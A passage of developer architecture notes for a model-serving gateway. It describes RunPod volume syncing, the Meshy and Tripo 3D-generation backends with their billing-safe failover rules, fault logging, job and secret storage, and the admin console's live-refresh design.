second failure blocks with “share file changing?”. A hash mismatch evicts the share
hash cache, and LAN chunks of at least 1 MiB are hashed off the event loop. A lost
completion answer counts as success only if HEAD has the right size, otherwise abort
and retry next round.

Fetch and LAN paths are reserved so there is never a second writer; pruning and
Delete unknown skip all reserved paths. A lost `/run` answer without a saved id
holds its paths for the job budget plus the backend queue allowance (default 300 s)
plus 60 s: the unseen job may still write. Only ReadTimeout, ReadError,
RemoteProtocolError, cancellation, or the unreadable-job-id RuntimeError creates
this hold; definite pre-submit failures do not. Holds persist in `state["ghost"]`
and survive restart; expired holds are dropped. Cleanup protects a `.gw-part`
whenever its final path is held by a fetch, ghost, LAN stream or multipart upload.
Link jobs wait for their blobs and use the same saved job lifecycle. Worker
fetch/link ops run before ComfyUI readiness and refuse an unmounted `/runpod-volume`
with a job-level error before any per-item work. Fetch accepts HTTPS only, resumes
`.gw-part`, checks size/hash before `os.replace`, and rejects absolute, `..`, NUL,
over-512-char or out-of-root paths per item. Resolved paths stay within `models/` or
`hf-cache/`; link targets must resolve within `/runpod-volume/hf-cache/`. Worker HF
credentials are sent only to HF hosts and kept off redirects. `info` reports mounted
volume bytes.

**Resume and gate.** Boot settles a saved fetch/link job by polling or confirmed
cancel before another writer, allowing the saved budget (four hours for old records)
plus 300 s queue time and 60 s margin before cancellation, then aborts saved and
listed multipart leftovers under both model roots. An unconfirmed cancel keeps the
gate closed. Shutdown preserves unsettled records. Expired RunPod results release
the saved writer with a logged and visible “result lost … files are re-checked”
warning; execution cost cannot be recovered from an expired response. The
five-second loop replans on alias/backend/config, LAN-generation or catalog changes,
explicit Sync now, or every ten minutes. It survives any round exception, including
a FAILED job's `RuntimeError`, with 30–600-second backoff; auth failures pause until
credentials change.

Each tick transfers one LAN file, one fetch batch or one link job. A completed unit
recomputes the plan and readiness purely over the cached needs/source/URLs and the
updated destination/manifest, without S3 listing or manifest GET. Waiting ticks do
no replanning or store writes; space checks save only changed blocks. The next tick
checks the change signature before starting another unit.

Sync now releases transfer blocks, URL attempts/fallbacks and LAN failure counts,
and evicts failed LAN hashes and URL HEAD sizes, while preserving held paths and
capacity decisions. A plan-present file or manifest link clears its persisted block.
Readiness excludes aliases touching remaining blocks. The routing snapshot is
swapped at the end of a good plan or completed transfer unit; transient S3/REST
errors keep the last good snapshot, while a gone or foreign volume clears it.
`modelsync_gate` checks cached readiness and status without I/O: configured volume
without controller/plan is not ready and returns an explanatory 503; blank `volume`
retains ungated M1 behavior. RunPod ids participate in the shared ComfyUI alias
needs/signature helpers. Console snapshots omit catalog and job-item URLs.

**Console.** Backends → RunPod volumes follows Managed hosts, with cached cards,
checklist, referencing-backend links, sync table/source badges, transfer progress,
fetch id, provisioned/used size, monthly cost and cumulative sync cost. The editor
shows the configured start size, read-only once created; the ceiling may never fall
below the grown size. A not-yet-created volume says so, no plan means no empty sync
table, and the Backends tab polls only for off/syncing volumes or active
transfers/jobs. Remaining files waiting on an offline LAN, missing endpoint or
blocks show phase `waiting`; their cached tables and unknown/partial cleanup remain
visible. Sync now, Delete unknown (checked paths plus confirmation) and Delete
volume (typed name, no references) are POST actions. Cards share `_host_sync` with a
volume action prefix and field name. Unknown cleanup refreshes ownership and plan
before deletion. Refused saves preserve typed input with 400; `volume_field_refusal`
validates the backend volume reference before writing, and the select renders in
every pane state. Cards/rows carry `data-k`, with no new script. Separate API/S3
secret forms show presence only: blank keeps, clear removes; S3 id and secret are
joined on POST. Endpoint/template provisioning and setting the worker's HF_TOKEN
remain operator work until M2b.

Tests (each guards a silent failure):

- `tests/test_s3vol.py`: AWS signatures/raw Unicode encoding, XML readers, three-page ListV2, multipart/ETags, HTTP-200 errors, auth, timeouts, size boundaries, secret-free URLs and payload hashing off the event loop.
- `tests/test_rpvolume.py`: adoption/gone/ownership money guards, pressure-only prune and capped growth, atomic cached readiness, HEAD ownership, batch splitting, fallbacks, multipart failures, writer reservations, persisted ghost holds, resume budgets/alias ownership, partial cleanup, retry resets, job-level versus item failures, HEAD caching/unknown sizes, one-unit readiness, current-byte growth accounting, backoff/auth pauses and shutdown.
- `tests/test_rpvolume_main.py`: controller reconciliation, state persistence, live adapter/secrets wiring, routing gate, reference validation, transfer budget overrides and confirmed-gone deletion guards.
- `tests/test_rpvolume_ui.py`: volume forms/cards, start versus grown size, reference links, recreation billing confirms, actions, secret presence, waiting-page polling, partial cleanup rows and backend fields in every pane.
- `tests/test_runpod_worker.py` (`FetchOps`): path/link escape refusal, resumable downloads, hash-before-rename, HF token from env only, unknown-size verification, unmounted-operation refusal and mounted-volume info.
- `tests/test_runpod_adapter.py` (`VolumeOps`): save-before-poll/cancel-on-save-failure, job-status recovery, account-key fallback and RunPod URL guard.

### `meshy.py`

The PURE half of the Meshy.ai backend (`type: meshy`; the HTTP half
is `adapters.MeshyAdapter`): the fixed `input_*` label table → Meshy request body
(`build_request`), the recorded request (`request_summary`, image data → byte size),
task-object parsing (`parse_task` — a SUCCEEDED task missing a requested format
raises, never a silently smaller delivery), the advertised schema (`public_fields`)
and `default_candidate`/`options_of` (admin option defaults, deep-copied — a shallow
copy would hand every alias the same `target_formats` list). No `main`/`adapters`
imports; covered by `test_meshy.py` + `test_meshy_adapter.py` (HTTP stub).
Three `ENDPOINTS`: the two image ones and **`rigging`** (`POST /openapi/v1/rigging`,
5 credits, bipeds) — a different request entirely (`_build_rigging`: the mesh as a
`model_url` data URI + `height_meters` + `name`, none of the image-to-3d options),
so its inputs are FILES, not image slots: `FILES` names them per endpoint
(`rigging: ["input_mesh_path"]`) and `public_fields` is a TRIPLE
`(params, images, files)` — `files` entries carry `{name, required, accept}` and are
what the schema endpoint advertises, what the playground renders as an upload and
what `main._decode_upload_files` checks a Meshy `files` key against (an image
endpoint has none → 400). `glb_data_uri` sniffs the `glTF` magic, so a renamed OBJ
is refused before 5 credits are spent, and `options_of` narrows `target_formats` to
`RIG_FORMATS` (glb/fbx) for the endpoint. `parse_task(task, formats, endpoint,
options)`: `rigging` reads the urls off `task["result"]`
(`rigged_character_<fmt>_url`, `basic_animations.<clip>_<fmt>_url`) instead of
`model_urls`, and `TaskState.downloads` is `[(filename, url)]` — the FILENAME is
decided here (`rigged.glb` vs `model.glb`, `walking`/`running` clips only with the
`animations` option), the adapter just downloads them in order. A missing FORMAT
still raises; a missing CLIP is skipped (a courtesy, not the delivery). A Meshy
alias candidate has no workflow — `cand["meshy"] = {endpoint, options}`; the client
may set only what the label table names (`input_name`, `input_face_num` →
`target_polycount` + `should_remesh`, `input_texture_resolution` px → 2k/4k/8k,
`input_texture_prompt`, `input_pose`; `input_remove_background`/`input_no_fingers`
are accepted and inert), the rest are admin options — the counterpart of a ComfyUI
`fixed` pin. `input_face_num` is advertised WITHOUT a default: `build_request` only
sets a polycount when the client sends one, and that also forces the remesh pass.
`adapters.public_fields(cand)` is the ONE seam schema/playground/shims read for both
candidate kinds, and `adapters.GEN_TYPES` (types whose adapter sets
`serves_generation`) replaces `type == "comfyui"` in `main` wherever "generation
backend" is meant; the GPU-host sites (`/free`, the targeted prompt stop via `adapter.cancel(job_id)`,
restart, watchdog) stay ComfyUI — a cloud task has nothing to interrupt, Meshy
finishes and bills it. A Meshy backend is always `paid` (it bills per task);
discovery = `GET /openapi/v1/balance` (0 → DOWN "no credits", balance + its age and
the rolling gen fail-rate in `/health` + the Backends tab); 402/429 raise
`CloudNoCredits`/`CloudBusy` (ConnectionError subclasses → failover, named by
`_fault_label`). A FAILED task is final UNLESS the vendor blames itself: Meshy's
`task_error.type` is the machine-readable verdict (`invalid_input` = permanent, while
`timeout`/`service_unavailable`/`server_error` are answered "retry the request" in the
docs), so `parse_task` sets `TaskState.retryable` from the TYPE — never from the
message prose — and `_poll` raises `CloudTaskRetryable` (ConnectionError subclass →
`self_retries`, then the next candidate) instead of the final `RuntimeError`. Two
guards keep that narrow: CANCELED is a decision, not a fault, and a task the vendor
already BILLED (`consumed_credits`) is never re-run whatever its type says — a retry
would buy the same mesh twice, the rule the Tripo convert/clip paths follow too.
A retryable failure only actually retries where a backend carries `self_retries` or a
second candidate exists; without either it still ends the job, just named correctly.
Tripo's V3 has no equivalent field, so its failures stay final by design (measured
2026-09-03, job 9cf448115b4b: a Meshy `server_error` at 45 % progress, 0 credits,
ended the job outright). While polling, a 4xx is a verdict about the
TASK (3 in a row → final `RuntimeError` naming the status) while transport errors,
5xx and 429 are about the SERVICE and get `disconnect_grace` seconds (default 30,
same key as ComfyUI) of CONTINUOUS failure before the failover-class error — a
poll-rate 429 must not end a task that is running and already paid for. A
standalone rigging job tags its own meta `rig: "meshy"` (a CHAIN's `rig` comes from
the successor config instead), so a rigged delivery is recognisable by that field on
either path; `normalize_delivery`/`validate_delivery` never run for `meshy` — the
cloud rigs to its own conventions, so the files ship exactly as they arrive.
Since Tripo joined, everything above is ONE half of a two-vendor interface: `meshy.py`
and `tripo.py` export the same names and nothing but those names is read by the
adapter, the console editor and `main` (duck-typed, no ABC — they are modules):
`KIND`/`VENDOR`/`URL` (kind key, display name, the backend form's fixed URL),
`ENDPOINTS`/`RIG_ENDPOINT`/`SUCCESS_STATUS`, `POLL_INTERVAL_DEFAULT`/
`MAX_WAIT_DEFAULT`, `AI_MODELS`/`FORMATS`/`RIG_FORMATS`, `OPTION_DEFAULTS` +
`OPTION_FIELDS` (the console's option FORM as data), `SLOTS`/`FILES`/
`IGNORED_PARAMS`, `endpoint_of`/`options_of`/`default_candidate`/`public_fields`/
`build_request`/`request_summary`/`parse_task`, a `<Kind>Input(RuntimeError)` for
final content errors, and the three help texts `BACKEND_HINT`/`ENDPOINT_HINT`/
`CHAIN_HINT`. `parse_task(task, formats, endpoint, options=…)` takes the whole option
block so the signature is identical for both (Meshy reads `options["animations"]`).

### `cloudtask.py`

The pure leaf both cloud modules import (no `main`/`adapters`
imports, no I/O): `TaskState` (status/progress/error/downloads/thumbnail/credits,
`progress` feeds the job view's live bar, plus `riggable`/`rig_type` for a task that answers a QUESTION instead of delivering a
file — Tripo's rig-check), and `parse_options(fields, form, defaults)` +
`field_value_str`, the reader and writer of the `opt__<key>` form the ONE console
editor renders from a module's `OPTION_FIELDS`. `parse_options` never raises on a
form — an unknown value falls back to that key's default, because the module's
`options_of` is the validator of record and runs on every read anyway. `meshy.py`
re-exports `TaskState` from here so `test_meshy.py` stayed unchanged. Covered by
`test_cloudtask.py`.

### `tripo.py`

The PURE half of the Tripo3D backend (`type: tripo`, API **V3**; the
HTTP half is `adapters.TripoAdapter`), declaring the module interface above. The one
structural difference from Meshy: **Tripo takes no inline bytes at all**, so
`build_request` receives `{label: file_token}` where `meshy.build_request` receives
bytes — the adapter `POST`s every image and mesh to `/v3/files` first
(`_collect_inputs` validates slot count and sniffs the magic BEFORE the first upload:
an upload for a request that can never run is litter nobody cleans up). Three
`ENDPOINTS` — `image-to-model`, `multiview-to-model` and **`rig`** (`RIG_ENDPOINT`,
25 credits, `input_mesh_path` as a FILE like Meshy's `rigging`). `rig-check` is
deliberately NOT among them: no alias can be configured on it, the adapter runs it as
a free step of the rig. Multiview needs `input_image_front` plus at least one more
view (Tripo refuses fewer than two) — checked in `_view_inputs` AND in
`_collect_inputs`. Every response is a `{code, data}` envelope, so `_task_body`
unwraps `data` and raises `_TaskVerdict` on a non-zero `code` under HTTP 200 (`_poll`
counts it exactly like a 4xx: three in a row = final), and `_classify_create` reads
**403 + code 2010** as out-of-credits (Tripo has no 402) → `CloudNoCredits`, 429 →
`CloudBusy`, 5xx/transport (uploads included) → `ConnectionError`, anything else
non-2xx or `code != 0` → final `rejected`. `parse_task` is TOTAL over the documented
statuses: one outside `TASK_STATUSES` is terminal with an explaining error rather
than polled to `max_wait` holding the slot (V2 also knew `banned`/`expired`).
One job is SEVERAL tasks — rig-check → the endpoint → one `/models/convert` per extra
format (5 credits) → one `/animations/retarget` per `animations` preset (10 credits) —
and they share ONE `max_wait`: every follow-up poll gets the REMAINDER of the budget
(the backend form says so). Only the NATIVE format is delivered by the primary task
(`model.glb`, or `rigged.<out_format>` = the FIRST ticked deliver format), so
`formats[0]` leads the list; a failed CONVERT fails the job (a requested delivery must
never silently shrink) while a failed or timed-out CLIP is skipped with a warning
(`clip_name`: `preset:walk` → `walk.glb`) — the rigged mesh is finished and paid for.
Once the PRIMARY task is billed, nothing after it may FAIL OVER: a convert failure of
EVERY class (429 → `CloudBusy`, 5xx → `ConnectionError`, `max_wait` → `TimeoutError`,
and the raw `httpx.HTTPError` a create's POST raises — a subclass of NEITHER, but named
literally in `main._GEN_FAILOVER_ERRORS`) is re-raised as a plain `RuntimeError` naming
the format and the paid task id, a CLIP failure of those same classes is skipped with a
warning, and an artifact DOWNLOAD failure (`CloudTaskAdapter.generate`, Meshy included)
becomes the same final `RuntimeError` — otherwise `_run_job` re-runs and re-bills the
whole image-to-model task on the next candidate over a blip on the asset host. Only the
rig-check, which runs BEFORE the paid task, keeps normal failover semantics. A client's
`input_rig_type` is checked (`tripo.check_rig_type`, the same `_rig_types_for` rule)
BEFORE the uploads, so a refused rig job never pushes its mesh.
Meta: `cloud`/`cloud_task_id`/`endpoint`/`ai_model`/`request`/`consumed_credits`
(SUMMED over every task)/`elapsed_ms`, plus `tasks: [{role, task_id, credits}]` (roles
`rig-check`, the endpoint, `convert:<fmt>`, `clip:<preset>`) so the job view can name
every BILLED task, and on the rig endpoint `rig: "tripo"`, `rig_spec` (`mixamo`
default — the Mixamo-compatible bone names Meshy has no answer for) and `rig_type`
(what the rig-check DETECTED, else what was submitted). Two cross-field rules live in
ONE place each so the builder, `options_of` and the advertised schema cannot diverge:
`_rig_types_for` — rig model `v1.0-20240301` rigs BIPEDS only, so `options_of`
normalizes a stored `rig_type` to `biped`, `public_fields` narrows
`input_rig_type.choices` to `["biped"]`, and a client value outside the set is
REFUSED (`TripoInput` — a final content error that ends the job before the rig task
exists, never quietly bent to biped: a caller asking for a quadruped must learn the
alias cannot do it); and `generate_parts`, which Tripo
rejects together with texture/pbr/quad/smart_low_poly, so `options_of` forces those
four off and a stored alias can never build a request that comes back 400. Client
labels: `input_face_num` → `face_limit` CLAMPED to 100…the model's cap (v3.1 1.5M,
v3.0 1M, v2.5 500k, P-series 50k; 150k with `quad`), `input_texture_resolution` px →
the `standard`/`detailed`/`extreme` bucket, `input_rig_type`; `input_name`/
`input_remove_background`/`input_no_fingers` are accepted and inert, and
`input_texture_prompt`/`input_pose`/`input_height_m` are NOT advertised at all —
Tripo has no field for them, and listing them would promise what the builder never
sends. The admin `face_limit` option is validated-or-`None`, NOT clamped (same
reasoning as `meshy.opt_polycount`: a stored value out of range means the candidate
is broken, and silently rewriting an admin's number is worse than falling back).
Covered by `test_tripo.py` + `test_tripo_adapter.py` (HTTP stub).

### `faults.py`

The backend fault log (pure, stdlib only): every time a backend
FAILED, kept for the console. It exists because every such signal used to vanish by
itself — `backend_error` is popped by the next good poll, a failed-over chat call
books as a 200, a job that crashed and then succeeded on a retry is a clean `done` —
so comfyui-strix (Evo-X2) crashing five times in 20 min on 2026-09-13 showed nowhere
but the journal. **`unreachable` is NOT a fault** (`faults.NOT_FAULT_KINDS`; Kai
2026-09-14: a backend that is off is a state, not an error): `record()` drops it and
`events_since()` hides rows written before the rule, so no recording point can book it,
and `faults_info` counts no downtime for such an outage — the live status keeps saying
"unreachable". A connection lost WHILE a job runs is `connection_lost`
(`_gen_fault_kind`: a builtin `ConnectionError`/`ReadError` after connecting — the
box died mid-work), which IS a fault. `main._note_fault(backend, source, kind, detail)`
records at the
recording points: `health` in `refresh_backend` (ONCE per outage — the first poll at
which the outage is a FAULT, usually the UP→DOWN one; `backend_error[bid]
["fault_since"]` carries that moment across every later poll whatever kind it shows,
and the next UP writes kind `faults.RECOVERED` with `dur_s` = now − `fault_since`,
which is what downtime sums from; the open-outage downtime in `faults_info` reads the
same key. Keyed on the CURRENT kind instead, a timeout→unreachable outage was never
closed and an unreachable→timeout one closed without opening), `call` in `_dispatch_over` (failover exceptions,
llama-swap's 502, and any 5xx passed to the client, with the body snippet), `job` in
`_run_job`/`_run_chain` (EVERY failed attempt, self-retries included — the job row
hides those), `watchdog` in `_spawn_comfy_restart`. Always on and independent of
`stats.enabled`: a bounded memory ring plus SQLite `faults.db` (`faults.db_path`,
`retention_days` default 7, startup-only; an unopenable DB degrades to memory and the
Statistic panel says so). `bundles()` groups by backend+source+kind+status+
`bundle_key` (hex ids and numbers masked — computed ONCE at `record()` into column
`bkey`; `init()` adds and backfills it on an older DB), `per_backend()` clips downtime
to the window and counts an outage STILL open (`down_since` from `backend_error`) up
to now. `main.faults_info()` is memoised 5 s keyed on `faults.generation()` (a new
event shows at once; it runs per Dashboard tick and per /health), resolves Hosts-tab labels and feeds the Dashboard (card, a
`faults · 24h` column, panel `_dash_faults`) and Statistic (`_faults_panel`, anchor
`#faults`); `/health` carries `faults_24h` per backend. `faults.db*` is in
`.gitignore` AND both `deploy.sh` exclude lists — without the latter `rsync --delete`
wipes prod's log on every deploy. `test_faults.py`.

### `jobs.py`

Generation job store: SQLite metadata + on-disk artifacts under
`jobs/<id>/<n>.<ext>` (image/video/audio; manifest carries `kind`+`mime`),
lifecycle `queued→running→done|failed`, TTL pruning. Also persists job **inputs**
(`set_inputs`: prompt/params/reference images, each with `sha256`+`bytes` like a
result entry — the job view proves WHICH bytes ran; JSON in meta, no migration)
and `reconcile_orphans()` (startup:
mark interrupted `running`/`queued` as failed). Terminal states are FINAL: every status
writer (`set_status`, `set_stage`, `fail`, `complete`, `complete_json`) is conditioned
on the row still being queued/running, so the first terminal write wins — a worker
finishing after a cancel can neither mark the job `done` nor resurrect it to `running`
(`set_status` returns False then, and the worker stops), and `complete()` of a row that
is no longer live writes no artifact directory. `merge_meta` is the one writer that
reaches a terminal row (facts, never status). `prune_once` removes FINISHED jobs only —
a short client `ttl_s` used to delete a running job under its worker.
`test_jobs_lifecycle.py`. Carries `owner`. Reused for
**background Responses** jobs (task type `response`, result via `complete_json`).

### `store.py`

Writable SQLite store, the console's source of truth: backends,
chat aliases, generation aliases (+ workflow_json/mapping/fixed), users (api keys
**encrypted** via `secret.key`, and therefore re-readable: the user editor
pre-fills an existing key so it can be copied again — masked, gated by the
`show_user_keys` setting, default ON, `admin._show_user_keys()`), IP aliases,
server settings. Seeded once from
config, then authoritative. `decrypt_secret` lets LEGACY plaintext pass through (old
rows keep working until re-saved); anything that must have been minted by the gateway
itself — the /ui session cookie — decrypts with `strict=True`, or a hand-typed value
is accepted as genuine. A BACKEND's api key is the opposite of a user key: never
rendered back (`_backend_form` shows a blank password field + an `api_key_clear` box;
blank keeps the stored key, and for a config backend being copied into the store
`backend_save` takes it from the live backend via `_backend_api_key` — the summary only
carries `api_key_set`; `test_backend_key_field.py`).

### `admin.py`

The `/ui` console (mounted via `admin.register(app)` +
`add_api_route`, *not* `include_router` — broken in this starlette build;
callbacks injected via `admin.bind(...)`).
Session-gated by `_ui_guard` once
locked. Tabs in `TABS`; a top tab can group child views via `SUBTABS` +
`_subnav()` (rendered outside `<main>` via `_page(subnav=…)`; `?sub=` on the
parent route, first child = default —
Playground: Chat | Media | Voice, Jobs & Calls: LLM | Media | Voice,
Aliases: Chat | Media, Input & Routing: Input | LLM models | Image models | LoRAs,
Server: Runtime | Restart | API Keys | Models; `_subnav(parent, sub, marks)` appends raw HTML
to a sub-tab's label — Server badges *Restart* `↻ restart` from every sub-tab while a
restart-only value differs from what runs, so a pending restart is never hidden).
**Server** (`_server_view`, one renderer for the page and every refused Save):
Runtime (`_SRV_RUNTIME` + the three flags), Restart (`_SRV_RESTART`, unit fields in
hours/minutes with `step="any"`, stored in seconds) and **API Keys** — every secret
the SERVER holds, each row its OWN form (`_srv_key_row`: set/not-set badge, a password
input never pre-filled, blank keeps): the master API key (`/ui/server/api-key` →
`server_api_key`, `store.set_settings({"api_key"})` + `_apply_server_settings`; no clear,
as before; a key with a space or control character, or over 1024 chars, is refused —
it could never match a header, and the Save also ends the console session; the sessions carry `admin_session_tag`, so a new key ends the old key's
sessions), one `<NAME> API token` per `hostapi.PROVIDERS` kind (`/ui/server/provider-
token` → `server_provider_token` → `main.save_provider_token`, `api_key_clear`) and the
Hugging Face token (`/ui/server/hf-token` → `server_hf_token` → `main.save_hf_token`,
`hf_token_clear`); a refusal is a 400 with the keys tab and the reason in THAT row,
never the value. `server_save` redirects to `?sub=<its tab>&saved=…` and validates
numbers with `_int_field`/`_float_field` (`_SRV_MIN`: port and health interval ≥ 1) —
"1.5"/"abc"/"-1" is a 400 with the form as typed, nothing stored; it used to become ""
(= the default) silently; a POST without a valid `_form` is a 400 (read as the Restart
form it CLEARED every restart-only override). **Models** (`_srv_models_body`, since
2026-10-01 — the operator's question was whether the LAN source is Thunder-specific; it
is not): what the model sync of EVERY managed host of every provider reads — the ONE
LAN model source (`_modelsrc_block`) and the model-sync catalog (`_catalog_editor`),
moved unchanged from the Backends tab, whose Managed hosts section keeps per-host things
only and points here with one muted line (`_MHOST_MODELS`). Their routes STAYED under
`/ui/hosts/managed/` (`catalog`, `modelsrc-scan|pin|list|host` — bookmarks and scripts
keep working, nothing was removed); only the answers moved: `_models_msg` redirects to
`?sub=models&msg=…` (shown as a neutral hint there — a refusal like "host key not
fetched" must not get the ✓ banner), a refused catalog or share host is a 400 with
`_server_view(…, "models", catalog_refused=/modelsrc_refused=)` — that tab, as typed —
and the 405 page of a GET leads back there (`_ACTION_BACK` is checked by exact path
first). Static: every action redirects back with its answer (*List now* shows the
fresh listing). The card's checklist item `key: "lan"` and the sync table's *waiting
for LAN source* badge link to it (`_CHECK_LINKS`), and `hostctl.SRC_UNSET` says
"enter the share host under Server → Models". Every `/ui/server` link names the
sub-tab that holds its setting (`test_server_tabs.py`).
**Aliases** (`/ui/aliases`, formerly "Mapping") joins what used to be two tabs: the
alias list + editors, and the live alias→route overviews that were Input & Routing's
Chat/Media-aliases sub-tabs. With nothing picked the right column IS the overview
(`_routing_chat_body` / `_routing_gen_body` — its backend filter is a GET form, since
inline handlers never navigate), the chat editor carries that alias's live routes
(`_chat_alias_routes`), and every overview row's alias name opens its editor. Old URLs
redirect with their query intact (`mapping_legacy`: `/ui/mapping?…` → `/ui/aliases?…`;
`/ui/routing?sub=chat|gen` → `?sub=chat|media`); the ACTION routes stay under
`/ui/mapping/<action>` and redirect back to `/ui/aliases`. `test_aliases_tab.py`.
The workflow editor (the media half of Aliases) owns a pasted
ComfyUI API JSON and offers discovery-fed dropdowns. A CLOUD alias has no workflow at
all: `_cloud_editor(kind, …)` + `cloud_update` (`POST /ui/mapping/cloud-update`, which
REPLACED the Meshy-only `/ui/mapping/meshy-update`) render the vendor's option block
from `mod.OPTION_FIELDS` and read it back through `cloudtask.parse_options` →
`mod.options_of` — the same normalization the request builder applies, so editor and
builder cannot drift; the structural fields (alias, task, endpoint, model, deliver
formats, retries, the chain block, the request-field table) stay the editor's and the
vendor supplies only the hints. The backend form's `#cloudopts` block carries
`cloud_max_wait`/`cloud_poll_interval` (named `cloud_*` because `#comfyopts` already
spends `max_wait`/`poll_interval`, and one form may carry each name only once), and
`_type_select` fills in the chosen kind's fixed URL when the field is blank or still
holds ANOTHER cloud kind's fixed URL — switching meshy → tripo would otherwise store a
Tripo backend pointing at api.meshy.ai, which surfaces only as an auth error at
discovery; a URL the operator typed themselves is never overwritten.
The Aliases sub-tab is derived
when `?sub=` is absent (`?edit=`/`?new=` → media, else chat), so the dozens of
existing action links keep working unchanged and still land in the right tab.
The Media list groups by `task` in `_TASK_OPTIONS` order (unknown tasks trail
alphabetically, so a typo stays visible) with a per-group count; the task is the
header, so the row shows what differs WITHIN a group (backends · mapped params).
**Auto-update is one mechanism, not six** (`_LIVE_JS`): `_page(refresh=N)` marks
`<main data-live="N">` and a global poller re-fetches the SAME url and MORPHS the
response's `<main>` into the live one — nodes matched by `id`, `data-k` or `data-sk`
(`keyOf`), falling back to position+tag. An UPDATE never reloads, so scroll, sort
order, a focused filter, an open form, playing media and the model-viewer camera
survive it; a response without `data-live` stops the poller (what the meta tag's
absence used to mean). The poller also owns the header's `#gwlive` chip (outside
`<main>`, so the morph never touches it): `live · 4s`, `stale since hh:mm:ss` on a
non-2xx answer, `offline since …` when the fetch fails — timed from the last GOOD
update; hidden on a static page. Media Jobs is always live (15 s idle), sortable, and
pages with a `?before=<job id>` keyset (`jobs.recent(before=)`). The one deliberate real navigation is the escape hatch:
a re-fetch that REDIRECTS to a different path does `location.href = r.url`, which
is how an expired session lands on `/ui/login` instead of having a login form
morphed into `<main>` — do not "simplify" it away. The three live row templates
carry a key themselves — `_job_row` → `job-<job id>`, `_call_row` → `call-<call
id>`, `_dash_backends`' row → `bk-<_bid>` (`type:name`, because an LLM and a
ComfyUI backend may share a name) — because those lists are newest-first (and the
backends panel re-sorts ready→busy→off): without a key the reconciler matches
POSITIONALLY and a list that gains one row rewrites EVERY row, which is the one
thing the mechanism exists to avoid. `data-sk` counts as a key for the same reason
one level up — the dashboard renders three of its four tables conditionally, and an
unkeyed table node would be reused for a DIFFERENT logical table when a panel comes
or goes. Never touched: `<script>`, `[data-live-skip]` subtrees (the `.fbxview`
container, which the server renders EMPTY and the client fills), focused/dirty form
controls, media with an unchanged `src`, and `<details open>`.
**The `<script>` rule cuts both ways, and the second way is the trap**: `adopt()`
drops a script it would otherwise INSERT, not just leave existing ones alone. So
markup that appears only in a LATER state of a live page arrives without its script
and silently never initialises — and `data-live` is typically gone in that same
response, so the poller stops and it cannot self-heal (measured: a finishing job's
`<model-viewer>`/`.fbxview` preview, a permanently black box until F5). Hence the
invariant every live page owes: **it must already contain every `<script>` any later
state of it can render** — hoist them (`job_detail_page`, `_playground_body`) and,
where the script must act on nodes arriving later, register the action in
`window.gwLiveHooks` (`gwFbxScan`). `test_admin_live.py` pins this, plus `data-live`
on `<main>` and that every JS constant parses — all three fail silently. "ES5" here
is a SYNTAX rule (no arrow functions, let/const, template strings, classes); later
DOM APIs (fetch, URL, `closest`, `Array.from`, `replaceChildren`) are used freely.
Post-morph hooks in `window.gwLiveHooks`: the SORT hook because the server always
renders insertion order and the morph re-imposes it (a clicked sort would be undone
every tick), the FILTER hook because rows the morph brings in FRESH carry no
`display` style and would ignore an active filter; the sort hook also `wire()`s
every sortable table, since a table the morph INSERTS mid-session never went through
the load-time binding and would otherwise ignore header clicks until a
real reload. The BACKEND-FORM TAB hook (`_TABS_JS`, `window.gwBackendTab`) is there
for the same reason: `_backend_form` is ONE form in four panes — General | Models |
Behavior | &lt;type&gt; — of which only `display` is ever switched, because a pane
rendered conditionally would drop its inputs from the POST and `backend_save` reads
absent as CLEARED (switching tabs would wipe what the other tabs hold). The server
always renders General, so the morph would reset the operator's tab every tick; the
choice lives in `sessionStorage` plus a module variable (a browser refusing site data
makes every read throw and a store-only version would look dead) and the hook
re-applies it. `_TABS_JS` is emitted by `_page()` for EVERY view, not from the form's
own markup, because the morph never INSERTS a `<script>`. Type-specific blocks keep
their four historic ids (`#llmopts`/`#comfyopts`/`#cloudopts`/`#anthopts`, pinned by
`test_cloud_editor.py`) and newer ones inside a shared pane declare
`data-btype="<types>"` (token `cloud` = every cloud kind); `_type_select`'s handler
drives both, renames the &lt;type&gt; tab and hides it for openai, and the hook then
falls back to General when the tab that was open just disappeared.
`test_backend_form_tabs.py`. This replaced four `<meta http-equiv="refresh">` pages (Dashboard,
Media Jobs, Job detail, Backends while draining) and both hand-rolled fragment
pollers: `_PG_POLL_JS` + `/ui/playground/status/{job_id}` (the media playground's
result column — the dirty-input rule is what keeps the form editable now) and
`_VU_POLL_JS` + `/ui/playground/voice-upload-status`, whose terminating
`location.replace(…&vu=done)` reload, the `vu=done` parameter and its branch left
with it (one tick now refreshes the progress column AND the voice-library table).
`voice_upload` therefore 303-redirects to the GET view: the poller re-fetches
`location.href`, and a POST-only URL answers a GET with 405; the per-user progress
entry is CONSUMED once its terminal state has been rendered (`prog["seen"]` → popped
on the next GET), because `_voice_upload_prog` lives for the whole process and the
`vu=done` reload that used to make it moot is gone. Of the state-restore
hacks the reload needed, only `_FILTER_JS`'s focus/caret save+restore and the
`blur`+`beforeunload` listeners that saved them are gone; `_SCROLL_JS`'s `<main>`
restore STAYS, because
`<main>` is the page's scroll container (`body{overflow:hidden}` +
`main{overflow-y:auto}` — on desktop; below 800 px `_CSS`'s media query lets the
whole page scroll, stacks the columns, and `_SCROLL_JS` also tracks the document) and
that restore serves REAL navigation (F5, a nav link
back to a long list, a POST's 303), which the morph does not cover — it is merely
inert from the first tick onward. POST bodies parsed by
hand (`parse_qs`) to stay `python-multipart`-free. Markup conventions: `_field(label,
control, hint=)` ties its `<label for>` to the control (its id, else `fld-<name>` is
added — `_CTRL_TAG` finds the control with a regex that skips QUOTED attribute values
whole: it used to stop at the first `>`, and the type select's inline handler holds
`indexOf(…)>=0`, so the id landed INSIDE the handler and its `"` cut it short —
switching the backend type silently toggled nothing, `test_backend_form_tabs`
`test_label_id_never_lands_inside_a_handler`) and renders `hint` as its own row —
never append a hint inside the control;
colours come from the `:root` palette in `_CSS` (`var(--muted)` …), boxed pickers use
`.box`; a sortable cell whose text is not the quantity carries `data-sv` (raw value),
and `_SORT_JS`'s `num()` reads the console's units (`102 ms`, `1.2 s`, `5m`, `$`).
**Every console action is a POST** (`_POST_ACTIONS`; `register()` gives exactly those
routes `methods=["POST"]`): a GET link fires on anything that makes a browser navigate
(link preview, prefetch, a pasted URL). A GET to any POST-only /ui path (a bookmark, an
old script) gets a 405 CONSOLE page with `Allow: POST` and a link back
(`_register_post_only_gets`, called LAST in `register()` so it derives the list from
the route table and stays out of the literal table the AST test reads) instead of
Starlette's bare JSON; it runs nothing. `_btn` renders any href to such a route as a
`<button form="gw-act" formaction=…>` — ONE empty form per page, emitted with
